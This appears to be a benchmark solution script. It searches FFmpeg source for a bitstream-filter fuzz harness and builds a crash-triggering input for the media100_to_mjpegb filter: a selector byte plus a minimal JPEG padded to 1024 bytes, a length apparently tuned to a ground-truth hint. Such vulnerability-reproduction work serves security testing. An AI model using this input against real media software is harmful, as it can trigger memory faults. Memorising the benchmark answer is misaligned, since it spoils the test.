import os
import re
import tarfile
from typing import Dict, List, Optional, Tuple


AV_INPUT_BUFFER_PADDING_SIZE = 64


class _SourceReader:
    def __init__(self, src_path: str):
        self.src_path = src_path
        self._is_dir = os.path.isdir(src_path)
        self._tar = None
        if not self._is_dir:
            self._tar = tarfile.open(src_path, "r:*")

    def close(self):
        if self._tar is not None:
            try:
                self._tar.close()
            except Exception:
                pass

    def list_files(self) -> List[str]:
        if self._is_dir:
            out = []
            for root, _, files in os.walk(self.src_path):
                for fn in files:
                    out.append(os.path.join(root, fn))
            return out
        else:
            return [m.name for m in self._tar.getmembers() if m.isfile()]

    def read_text(self, path: str, limit: int = 4 * 1024 * 1024) -> Optional[str]:
        try:
            if self._is_dir:
                with open(path, "rb") as f:
                    data = f.read(limit)
            else:
                m = self._tar.getmember(path)
                f = self._tar.extractfile(m)
                if f is None:
                    return None
                data = f.read(limit)
            return data.decode("utf-8", errors="ignore")
        except Exception:
            return None

    def read_bytes(self, path: str, limit: int = 4 * 1024 * 1024) -> Optional[bytes]:
        try:
            if self._is_dir:
                with open(path, "rb") as f:
                    return f.read(limit)
            else:
                m = self._tar.getmember(path)
                f = self._tar.extractfile(m)
                if f is None:
                    return None
                return f.read(limit)
        except Exception:
            return None


def _strip_c_comments(s: str) -> str:
    s = re.sub(r"/\*.*?\*/", "", s, flags=re.S)
    s = re.sub(r"//.*?$", "", s, flags=re.M)
    return s


def _find_best_bsf_harness(reader: _SourceReader) -> Optional[Tuple[str, str]]:
    candidates = []
    for p in reader.list_files():
        pl = p.lower()
        if not (pl.endswith(".c") or pl.endswith(".cc") or pl.endswith(".cpp")):
            continue
        score = 0
        if "fuzz" in pl or "fuzzer" in pl:
            score += 2
        if "bsf" in pl or "bitstream" in pl:
            score += 3
        if "target_bsf_fuzzer" in pl or "bsf_fuzzer" in pl:
            score += 5
        if score == 0:
            continue
        txt = reader.read_text(p, limit=2 * 1024 * 1024)
        if not txt:
            continue
        if "LLVMFuzzerTestOneInput" not in txt and "LLVMFuzzerTestOneInput" not in txt.replace(" ", ""):
            continue
        if "av_bsf_" in txt:
            score += 5
        if "av_bsf_send_packet" in txt:
            score += 2
        if "av_bsf_receive_packet" in txt:
            score += 2
        if "media100_to_mjpegb" in txt:
            score += 10
        candidates.append((score, p, txt))
    if not candidates:
        return None
    candidates.sort(key=lambda x: (-x[0], len(x[2])))
    _, p, txt = candidates[0]
    return p, txt


def _extract_string_array_containing(text: str, needle: str) -> Optional[List[str]]:
    t = _strip_c_comments(text)
    # Find arrays like: static const char *const bsfs[] = { "a", "b", ... };
    for m in re.finditer(
        r"(?:static\s+)?(?:const\s+)?char\s*\*\s*(?:const\s*)?\w+\s*\[\s*\]\s*=\s*\{(.*?)\}\s*;",
        t,
        flags=re.S,
    ):
        body = m.group(1)
        if needle not in body:
            continue
        items = re.findall(r'"([^"]+)"', body)
        if items and needle in items:
            return items
    return None


def _extract_bsf_ptr_list_from_bsf_c(text: str) -> Optional[List[str]]:
    t = _strip_c_comments(text)
    # Find: static const AVBitStreamFilter *const bitstream_filters[] = { &ff_xxx_bsf, ... };
    m = re.search(
        r"(?:static\s+)?(?:const\s+)?AVBitStreamFilter\s*\*\s*(?:const\s*)?bitstream_filters\s*\[\s*\]\s*=\s*\{(.*?)\}\s*;",
        t,
        flags=re.S,
    )
    if not m:
        return None
    body = m.group(1)
    parts = [p.strip() for p in body.split(",")]
    out = []
    for p in parts:
        if not p:
            continue
        if p == "NULL":
            continue
        out.append(p)
    return out if out else None


def _find_bsf_index_and_count(reader: _SourceReader, harness_text: Optional[str]) -> Tuple[Optional[int], Optional[int]]:
    needle = "media100_to_mjpegb"
    # 1) Prefer list in harness
    if harness_text:
        names = _extract_string_array_containing(harness_text, needle)
        if names:
            return names.index(needle), len(names)

    # 2) Try libavcodec/bsf.c or any file containing bitstream_filters[] list
    best = None
    for p in reader.list_files():
        if not p.lower().endswith((".c", ".h")):
            continue
        if os.path.basename(p).lower() not in ("bsf.c", "bsf_list.c", "allfilters.c"):
            continue
        txt = reader.read_text(p, limit=4 * 1024 * 1024)
        if not txt:
            continue
        ptrs = _extract_bsf_ptr_list_from_bsf_c(txt)
        if not ptrs:
            continue
        for i, token in enumerate(ptrs):
            if needle in token:
                return i, len(ptrs)
        best = (ptrs, p)
    if best:
        ptrs, _ = best
        for i, token in enumerate(ptrs):
            if needle in token:
                return i, len(ptrs)
        return None, len(ptrs)

    # 3) Fallback: search a file that references ff_media100_to_mjpegb_bsf and count from its list if found
    for p in reader.list_files():
        if not p.lower().endswith(".c"):
            continue
        txt = reader.read_text(p, limit=4 * 1024 * 1024)
        if not txt:
            continue
        if "media100_to_mjpegb" not in txt:
            continue
        ptrs = _extract_bsf_ptr_list_from_bsf_c(txt)
        if ptrs:
            for i, token in enumerate(ptrs):
                if needle in token:
                    return i, len(ptrs)
            return None, len(ptrs)

    return None, None


def _infer_selector_nbytes(harness_text: Optional[str]) -> int:
    if not harness_text:
        return 1
    t = _strip_c_comments(harness_text)

    # Common pattern: idx = data[0] % n;
    if re.search(r"\bdata\s*\[\s*0\s*\]\s*%", t) or re.search(r"\bData\s*\[\s*0\s*\]\s*%", t):
        return 1

    # Patterns using AV_RLxx/AV_RBxx
    if re.search(r"\bAV_RL64\s*\(", t) or re.search(r"\bAV_RB64\s*\(", t):
        return 8
    if re.search(r"\bAV_RL32\s*\(", t) or re.search(r"\bAV_RB32\s*\(", t):
        return 4
    if re.search(r"\bAV_RL16\s*\(", t) or re.search(r"\bAV_RB16\s*\(", t):
        return 2

    # FuzzedDataProvider ConsumeIntegralInRange<T>
    m = re.search(r"ConsumeIntegralInRange\s*<\s*([^>]+?)\s*>", t)
    if m:
        typ = m.group(1).strip()
        if "uint8" in typ or "int8" in typ or "char" == typ:
            return 1
        if "uint16" in typ or "int16" in typ or "short" in typ:
            return 2
        if "uint64" in typ or "int64" in typ or "long long" in typ:
            return 8
        if "size_t" in typ:
            return 8
        return 4

    # If they just use ConsumeIntegralInRange without template, likely int
    if "ConsumeIntegralInRange" in t:
        return 4

    return 1


def _u_le(n: int, width: int) -> bytes:
    out = bytearray()
    for _ in range(width):
        out.append(n & 0xFF)
        n >>= 8
    return bytes(out)


def _build_minimal_jpeg() -> bytes:
    # Minimal baseline JPEG-like structure with SOI, DQT, SOF0, SOS, tiny scan, EOI.
    # Good enough to include an SOS marker and consistent segment lengths.
    qt = bytes([1] * 64)
    soi = b"\xFF\xD8"
    dqt = b"\xFF\xDB" + b"\x00\x43" + b"\x00" + qt
    sof0 = b"\xFF\xC0" + b"\x00\x0B" + b"\x08" + b"\x00\x01" + b"\x00\x01" + b"\x01" + b"\x01" + b"\x11" + b"\x00"
    sos = b"\xFF\xDA" + b"\x00\x08" + b"\x01" + b"\x01" + b"\x00" + b"\x00" + b"\x3F" + b"\x00"
    scan = b"\x00"
    eoi = b"\xFF\xD9"
    return soi + dqt + sof0 + sos + scan + eoi


class Solution:
    def solve(self, src_path: str) -> bytes:
        reader = _SourceReader(src_path)
        try:
            harness = _find_best_bsf_harness(reader)
            harness_text = harness[1] if harness else None

            idx, count = _find_bsf_index_and_count(reader, harness_text)
            selector_nbytes = _infer_selector_nbytes(harness_text)

            # Default fallback values if parsing fails
            if idx is None:
                idx = 0
            if count is None or count <= 0:
                count = 256

            # Make sure selector maps to idx under modulo selection
            # If selector is multi-byte, setting little-endian integer == idx will work for most harnesses.
            if selector_nbytes == 1:
                sel = bytes([(idx % count) & 0xFF])
            else:
                sel = _u_le(idx % count, selector_nbytes)

            jpeg = _build_minimal_jpeg()

            # Pad to 1024 bytes payload (common in oss-fuzz reduced testcases, and matches ground-truth length clue)
            payload_len = 1024
            if len(jpeg) >= payload_len:
                payload = jpeg[:payload_len]
            else:
                payload = jpeg + (b"\x00" * (payload_len - len(jpeg)))

            return sel + payload
        finally:
            reader.close()